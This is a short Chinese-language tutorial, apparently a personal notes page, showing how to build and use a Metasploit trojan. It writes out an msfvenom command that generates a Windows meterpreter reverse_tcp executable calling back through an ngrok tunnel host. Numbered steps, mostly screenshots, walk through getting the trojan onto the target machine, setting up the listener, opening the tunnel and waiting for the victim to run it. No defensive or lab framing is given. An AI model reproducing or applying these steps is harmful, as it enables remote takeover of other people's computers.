1.打开msfconsole![image-20210118230943187](../..//img/image-20210118230943187.png)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ngrok2.xiaomiqiu.cn LPORT=14444 -f exe -o .exe
```

2.输入上述命令进行木马制作

在目标文件夹下生成木马软件

![image-20210118233216072](../../img/image-20210118233216072.png)

3.木马到达目标主机
![image-20210118231923288](../..//img/image-20210118231923288.png)

4.打开攻击机利用模块
![image-20210118232428036](../..//img/image-20210118232428036.png)

5.设置payload 的监听端口
![image-20210118232624483](../..//img/image-20210118232624483.png)

6.等待连接
![image-20210118232659242](../..//img/image-20210118232659242.png)

7.开启tcp内网穿透

![image-20210118233007170](../..//img/image-20210118233007170.png)


8.点击运行木马
![image-20210118232837604](../..//img/image-20210118232837604.png)